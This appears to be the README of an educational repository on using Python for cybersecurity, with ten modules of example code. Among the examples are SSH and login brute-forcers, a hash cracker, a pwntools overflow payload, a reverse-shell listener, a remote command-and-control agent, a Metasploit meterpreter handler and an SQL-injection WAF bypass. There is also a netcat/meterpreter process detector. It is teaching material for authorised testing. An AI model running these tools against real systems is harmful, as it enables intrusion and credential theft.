# Python for Cybersecurity 🐍🔒

A structured learning path from **basic to advanced** Python concepts applied to cybersecurity. A basic understanding of Python syntax is helpful but **not required** — this guide will introduce concepts as they are needed.

---

## 📚 Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Environment Setup](#environment-setup)
4. [Module 1 — Python Basics for Security](#module-1--python-basics-for-security)
5. [Module 2 — Networking Fundamentals](#module-2--networking-fundamentals)
6. [Module 3 — Working with Files & Data](#module-3--working-with-files--data)
7. [Module 4 — Web & HTTP Interaction](#module-4--web--http-interaction)
8. [Module 5 — Cryptography](#module-5--cryptography)
9. [Module 6 — Scanning & Reconnaissance](#module-6--scanning--reconnaissance)
10. [Module 7 — Password Security & Cracking](#module-7--password-security--cracking)
11. [Module 8 — Exploit Development Basics](#module-8--exploit-development-basics)
12. [Module 9 — Malware Analysis & Forensics](#module-9--malware-analysis--forensics)
13. [Module 10 — Advanced Topics](#module-10--advanced-topics)
14. [Ethical & Legal Guidelines](#ethical--legal-guidelines)
15. [Resources & Further Reading](#resources--further-reading)

---

## Introduction

This repository is a practical guide to using **Python in cybersecurity**. Each module builds on the previous one, starting with the fundamentals of Python and gradually moving toward advanced offensive and defensive security techniques.

Python is one of the most popular languages in the security community because of its:
- Simple, readable syntax
- Rich ecosystem of security-focused libraries (`scapy`, `cryptography`, `requests`, `impacket`, etc.)
- Rapid prototyping capability for tools and scripts
- Wide use in CTF (Capture The Flag) challenges and professional penetration testing

---

## Prerequisites

| Topic | Required? |
|---|---|
| Basic Python syntax (variables, loops, functions) | Recommended but not required |
| Understanding of networking (IP, TCP/UDP) | Helpful |
| Linux/Unix command line basics | Helpful |

> **No prior cybersecurity experience is needed.** Security concepts are introduced as they appear throughout the modules.

---

## Environment Setup

### 1. Install Python 3

Download Python 3 from [python.org](https://www.python.org/downloads/) or install via your package manager:

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install python3 python3-pip

# macOS (with Homebrew)
brew install python
```

### 2. Create a Virtual Environment (Recommended)

```bash
python3 -m venv venv
source venv/bin/activate       # Linux/macOS
venv\Scripts\activate          # Windows
```

### 3. Install Common Security Libraries

```bash
pip install requests scapy cryptography paramiko impacket pwntools
```

### 4. Recommended Tools

- **Kali Linux** or **Parrot OS** — security-focused Linux distributions with many tools pre-installed
- **Wireshark** — network packet analyzer
- **Burp Suite Community** — web application security testing
- **VS Code** or **PyCharm** — code editors with good Python support

---

## Module 1 — Python Basics for Security

> *If you already know Python basics, you can skim this module.*

### Variables and Data Types

```python
ip_address = "192.168.1.1"    # string
port = 80                      # integer
is_open = True                 # boolean
ports = [22, 80, 443, 8080]   # list
```

### Control Flow

```python
for port in [22, 80, 443]:
    if port == 80:
        print(f"Port {port} is HTTP")
    else:
        print(f"Port {port} found")
```

### Functions

```python
def is_valid_ip(ip):
    parts = ip.split(".")
    return len(parts) == 4 and all(0 <= int(p) <= 255 for p in parts)

print(is_valid_ip("192.168.1.1"))  # True
print(is_valid_ip("999.1.1.1"))    # False
```

### Reading User Input and Command-Line Arguments

```python
import sys

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <target>")
    sys.exit(1)

target = sys.argv[1]
print(f"Target: {target}")
```

### Exception Handling

```python
try:
    with open("passwords.txt") as f:
        data = f.read()
except FileNotFoundError:
    print("File not found.")
except PermissionError:
    print("Access denied.")
```

---

## Module 2 — Networking Fundamentals

### Sockets — The Foundation of Network Tools

Python's built-in `socket` library lets you create low-level network connections.

```python
import socket

# Resolve a hostname
ip = socket.gethostbyname("example.com")
print(f"IP: {ip}")

# Simple TCP connection check
def check_port(host, port, timeout=1):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        return result == 0   # 0 means port is open

print(check_port("192.168.1.1", 80))
```

### Simple Port Scanner

```python
import socket

def scan_ports(host, port_range):
    print(f"Scanning {host}...")
    open_ports = []
    for port in range(*port_range):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((host, port)) == 0:
                open_ports.append(port)
                print(f"  [OPEN] Port {port}")
    return open_ports

scan_ports("127.0.0.1", (1, 1025))
```

### Banner Grabbing

Banner grabbing identifies software running on open ports.

```python
import socket

def grab_banner(host, port):
    try:
        with socket.socket() as s:
            s.settimeout(2)
            s.connect((host, port))
            banner = s.recv(1024).decode().strip()
            return banner
    except Exception as e:
        return str(e)

print(grab_banner("example.com", 80))
```

### UDP Sockets

```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(b"Hello", ("8.8.8.8", 53))
```

---

## Module 3 — Working with Files & Data

### Reading and Writing Files

```python
# Read a wordlist
with open("wordlist.txt") as f:
    words = [line.strip() for line in f]

# Write results to a file
with open("results.txt", "w") as f:
    for word in words:
        f.write(word + "\n")
```

### Parsing Logs

```python
import re

log_line = '192.168.1.5 - - [24/Feb/2026:07:00:00] "GET /admin HTTP/1.1" 401'

pattern = r'(\d+\.\d+\.\d+\.\d+).*"(\w+) (\S+).*" (\d{3})'
match = re.search(pattern, log_line)
if match:
    ip, method, path, status = match.groups()
    print(f"IP: {ip}, Method: {method}, Path: {path}, Status: {status}")
```

### Working with JSON

```python
import json

# Parse JSON response
data = '{"host": "192.168.1.1", "ports": [22, 80]}'
parsed = json.loads(data)
print(parsed["host"])

# Save results as JSON
results = {"target": "192.168.1.1", "open_ports": [22, 80, 443]}
with open("scan_results.json", "w") as f:
    json.dump(results, f, indent=4)
```

### Working with CSV

```python
import csv

with open("hosts.csv", newline="") as f:
    reader = csv.DictReader(f)
    for row in reader:
        print(row["ip"], row["hostname"])
```

---

## Module 4 — Web & HTTP Interaction

### Making HTTP Requests

```python
import requests

response = requests.get("https://example.com")
print(response.status_code)
print(response.headers)
print(response.text[:500])
```

### Directory Brute-Forcing

```python
import requests

target = "http://example.com"
wordlist = ["admin", "login", "dashboard", "backup", "config"]

for path in wordlist:
    url = f"{target}/{path}"
    r = requests.get(url, timeout=3)
    if r.status_code != 404:
        print(f"[{r.status_code}] {url}")
```

### Sending Form Data (Login Brute-Force Simulation)

```python
import requests

login_url = "http://example.com/login"
usernames = ["admin", "user"]
passwords = ["password", "123456", "admin"]

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        r = requests.post(login_url, data=data)
        if "Welcome" in r.text:
            print(f"[+] Valid credentials: {username}:{password}")
```

> ⚠️ **Only test against systems you own or have explicit written permission to test.**

### Parsing HTML with BeautifulSoup

```python
from bs4 import BeautifulSoup
import requests

r = requests.get("https://example.com")
soup = BeautifulSoup(r.text, "html.parser")

# Extract all links
for link in soup.find_all("a"):
    print(link.get("href"))
```

---

## Module 5 — Cryptography

### Hashing

Hashing is one-way — you cannot reverse a hash to get the original input.

```python
import hashlib

data = "password123"

md5_hash    = hashlib.md5(data.encode()).hexdigest()
sha1_hash   = hashlib.sha1(data.encode()).hexdigest()
sha256_hash = hashlib.sha256(data.encode()).hexdigest()

print(f"MD5:    {md5_hash}")
print(f"SHA1:   {sha1_hash}")
print(f"SHA256: {sha256_hash}")
```

### Password Hashing (Secure Storage)

```python
import bcrypt

password = b"securepassword"
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
print(hashed)

# Verify
if bcrypt.checkpw(password, hashed):
    print("Password matches!")
```

### Symmetric Encryption (AES)

```python
from cryptography.fernet import Fernet

# Generate a key
key = Fernet.generate_key()
cipher = Fernet(key)

message = b"Secret payload"
encrypted = cipher.encrypt(message)
decrypted = cipher.decrypt(encrypted)

print(f"Encrypted: {encrypted}")
print(f"Decrypted: {decrypted}")
```

### Encoding vs. Encryption

| Technique | Reversible? | Use Case |
|---|---|---|
| Base64 encoding | ✅ Yes | Data transport, obfuscation |
| Hashing (MD5/SHA) | ❌ No | Integrity checking, passwords |
| Symmetric encryption (AES) | ✅ Yes (with key) | Data confidentiality |
| Asymmetric encryption (RSA) | ✅ Yes (with key) | Key exchange, digital signatures |

```python
import base64

encoded = base64.b64encode(b"Hello, Security!")
decoded = base64.b64decode(encoded)
print(encoded, decoded)
```

---

## Module 6 — Scanning & Reconnaissance

### ICMP Ping Sweep with Scapy

```python
from scapy.all import ICMP, IP, sr1

def ping(host):
    pkt = IP(dst=host) / ICMP()
    reply = sr1(pkt, timeout=1, verbose=0)
    return reply is not None

hosts = [f"192.168.1.{i}" for i in range(1, 255)]
alive = [h for h in hosts if ping(h)]
print("Live hosts:", alive)
```

### SYN Scan (Stealth Scan) with Scapy

A SYN scan sends a SYN packet but never completes the three-way handshake — making it harder to detect in logs.

```python
from scapy.all import IP, TCP, sr1, RandShort

def syn_scan(host, port):
    pkt = IP(dst=host) / TCP(sport=RandShort(), dport=port, flags="S")
    response = sr1(pkt, timeout=1, verbose=0)
    if response and response.haslayer(TCP):
        if response[TCP].flags == 0x12:  # SYN-ACK
            return "open"
        elif response[TCP].flags == 0x14:  # RST-ACK
            return "closed"
    return "filtered"

print(syn_scan("192.168.1.1", 80))
```

### DNS Enumeration

```python
import dns.resolver

domain = "example.com"
record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]

for rtype in record_types:
    try:
        answers = dns.resolver.resolve(domain, rtype)
        for answer in answers:
            print(f"{rtype}: {answer}")
    except Exception:
        pass
```

### OS Fingerprinting (TTL-based)

```python
from scapy.all import IP, ICMP, sr1

def ttl_os_guess(host):
    pkt = IP(dst=host) / ICMP()
    reply = sr1(pkt, timeout=1, verbose=0)
    if reply:
        ttl = reply[IP].ttl
        if ttl <= 64:
            return "Linux/Unix"
        elif ttl <= 128:
            return "Windows"
        else:
            return "Network device"
    return "No response"

print(ttl_os_guess("192.168.1.1"))
```

---

## Module 7 — Password Security & Cracking

### Dictionary Attack on MD5 Hashes

```python
import hashlib

def crack_md5(hash_to_crack, wordlist_path):
    with open(wordlist_path) as f:
        for word in f:
            word = word.strip()
            if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
                print(f"[+] Cracked: {word}")
                return word
    print("[-] Not found")
    return None

crack_md5("5f4dcc3b5aa765d61d8327deb882cf99", "wordlist.txt")  # "password"
```

### SSH Brute-Force with Paramiko

```python
import paramiko

def ssh_brute(host, username, wordlist):
    for password in wordlist:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password, timeout=3)
            print(f"[+] Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"Error: {e}")
            break
    return None
```

> ⚠️ **Only test against systems you own or have explicit written permission to test.**

### Generating a Custom Wordlist

```python
import itertools
import string

def generate_wordlist(min_len, max_len, charset=string.ascii_lowercase + string.digits):
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(charset, repeat=length):
            yield "".join(combo)

# Write first 100 combinations to file
with open("custom_wordlist.txt", "w") as f:
    gen = generate_wordlist(1, 3)
    for i, word in enumerate(gen):
        if i >= 100:
            break
        f.write(word + "\n")
```

---

## Module 8 — Exploit Development Basics

### Buffer Overflow Concepts

A buffer overflow occurs when a program writes more data to a buffer than it can hold, potentially overwriting return addresses and hijacking program execution.

```python
# Generating a simple repeating pattern to fill a buffer.
# Note: For real exploit development, use pwntools' cyclic() which
# generates a true De Bruijn sequence to identify exact offsets:
#   from pwn import cyclic; print(cyclic(100))
def cyclic_pattern(length):
    pattern = ""
    chars = string.ascii_lowercase
    for i in range(length):
        pattern += chars[i % len(chars)]
    return pattern

print(cyclic_pattern(100))
```

### Sending Exploit Payloads with pwntools

```python
from pwn import *

# Connect to a vulnerable service
conn = remote("192.168.1.100", 4444)

# Build payload: padding + return address
offset = 64
ret_addr = p32(0xdeadbeef)  # little-endian 32-bit
payload = b"A" * offset + ret_addr

conn.send(payload)
conn.interactive()
```

### Format String Vulnerability Example

```python
# Vulnerable C equivalent: printf(user_input)
# In Python, simulating what happens:
def vulnerable_format(user_input):
    # Safe version:
    print("Safe:   %s" % "user input")
    # Unsafe equivalent — never do this with untrusted input:
    # print(user_input % ())
    pass
```

### Reverse Shell Listener

```python
import socket

def start_listener(port=4444):
    with socket.socket() as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        print(f"Listening on port {port}...")
        conn, addr = s.accept()
        print(f"Connection from {addr}")
        with conn:
            while True:
                cmd = input("Shell> ")
                conn.send(cmd.encode() + b"\n")
                output = conn.recv(4096).decode()
                print(output)
```

---

## Module 9 — Malware Analysis & Forensics

### Static Analysis — Reading File Metadata

```python
import os
import hashlib

def file_info(path):
    stat = os.stat(path)
    with open(path, "rb") as f:
        data = f.read()
    md5 = hashlib.md5(data).hexdigest()
    sha256 = hashlib.sha256(data).hexdigest()
    return {
        "size": stat.st_size,
        "md5": md5,
        "sha256": sha256,
    }

print(file_info("/usr/bin/ls"))
```

### Extracting Strings from a Binary

```python
import re

def extract_strings(filepath, min_len=4):
    with open(filepath, "rb") as f:
        data = f.read()
    pattern = f"[^\\x00-\\x1F\\x7F-\\xFF]{{{min_len},}}".encode()
    return re.findall(pattern, data)

for s in extract_strings("/usr/bin/ls")[:20]:
    print(s.decode(errors="replace"))
```

### Network Traffic Analysis with Scapy

```python
from scapy.all import rdpcap, IP, TCP

packets = rdpcap("capture.pcap")

for pkt in packets:
    if IP in pkt and TCP in pkt:
        print(f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")
```

### Detecting Suspicious Processes

```python
import psutil

SUSPICIOUS = ["nc", "ncat", "netcat", "meterpreter"]

for proc in psutil.process_iter(["pid", "name", "cmdline"]):
    name = proc.info["name"].lower()
    if any(s in name for s in SUSPICIOUS):
        print(f"[!] Suspicious process: PID={proc.info['pid']} Name={proc.info['name']}")
```

---

## Module 10 — Advanced Topics

### Writing a Custom C2 (Command & Control) Framework

A basic C2 framework consists of:
- **Listener (server)** — waits for connections from compromised hosts
- **Agent (client)** — runs on the compromised host, executes commands, returns output

```python
# Minimal agent concept (educational only)
import socket, subprocess

def agent(host, port):
    with socket.socket() as s:
        s.connect((host, port))
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                break
            # WARNING: shell=True with unsanitized input is vulnerable to command injection.
            # This is intentional here to simulate a real agent, but never use shell=True
            # with untrusted input in production code.
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            s.send(output.encode() or b"(no output)\n")
```

> ⚠️ **This is for educational purposes only. Never deploy on unauthorized systems.**

### Automating Metasploit with Python (msfrpc)

```python
# Requires metasploit and the `pymetasploit3` library
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient("password", port=55553)
exploit = client.modules.use("exploit", "multi/handler")
exploit["PAYLOAD"] = "python/meterpreter/reverse_tcp"
exploit["LHOST"] = "0.0.0.0"
exploit["LPORT"] = 4444
exploit.execute(payload=exploit["PAYLOAD"])
```

### Bypassing Simple WAFs (Web Application Firewalls)

```python
import requests

headers = {
    "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "X-Forwarded-For": "127.0.0.1",
}

# URL encoding bypass attempt
payload = "1' OR '1'='1"
import urllib.parse
encoded = urllib.parse.quote(payload)

r = requests.get(f"http://example.com/search?q={encoded}", headers=headers)
print(r.status_code)
```

### Building a Python-Based IDS (Intrusion Detection System)

```python
from scapy.all import sniff, IP, TCP

SUSPICIOUS_PORTS = {22, 23, 3389, 4444, 5555}

def detect(pkt):
    if IP in pkt and TCP in pkt:
        dport = pkt[TCP].dport
        if dport in SUSPICIOUS_PORTS:
            print(f"[ALERT] Suspicious traffic: {pkt[IP].src} -> {pkt[IP].dst}:{dport}")

print("Starting IDS... (requires root)")
sniff(filter="tcp", prn=detect, store=False)
```

---

## Ethical & Legal Guidelines

> **This repository is for educational and authorized security testing ONLY.**

- ✅ Always obtain **written permission** before testing any system you do not own.
- ✅ Use these techniques in **controlled lab environments** (e.g., VMs, HackTheBox, TryHackMe).
- ❌ Never scan, probe, or attack systems without explicit authorization.
- ❌ Never use these techniques to access private data or disrupt services.

Unauthorized access to computer systems is illegal in most countries (e.g., the Computer Fraud and Abuse Act in the US, the Computer Misuse Act in the UK).

### Recommended Practice Platforms

| Platform | Description |
|---|---|
| [TryHackMe](https://tryhackme.com) | Beginner-friendly guided labs |
| [HackTheBox](https://www.hackthebox.com) | Intermediate/Advanced CTF-style machines |
| [PicoCTF](https://picoctf.org) | CTF competitions for students |
| [VulnHub](https://www.vulnhub.com) | Downloadable vulnerable VMs |
| [DVWA](https://dvwa.co.uk) | Damn Vulnerable Web Application (self-hosted) |

---

## Resources & Further Reading

### Books

- *Black Hat Python* — Justin Seitz & Tim Arnold
- *Violent Python* — TJ O'Connor
- *The Web Application Hacker's Handbook* — Stuttard & Pinto
- *Hacking: The Art of Exploitation* — Jon Erickson

### Online Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — Most critical web application security risks
- [Python Docs — socket](https://docs.python.org/3/library/socket.html)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [cryptography.io](https://cryptography.io/)
- [pwntools Docs](https://docs.pwntools.com/)

### Cheat Sheets

- [Python3 Cheat Sheet](https://perso.limsi.fr/pointal/_media/python:cours:mementopython3-english.pdf)
- [Nmap Cheat Sheet](https://www.stationx.net/nmap-cheat-sheet/)
- [Netcat Cheat Sheet](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

---

## Contributing

Contributions are welcome! Please open an issue or pull request for:
- New modules or topics
- Bug fixes in code examples
- Improved explanations

---

## License

This project is intended for educational use. All code examples are provided **as-is** for learning purposes only.

---

*Happy Hacking (ethically)! 🛡️*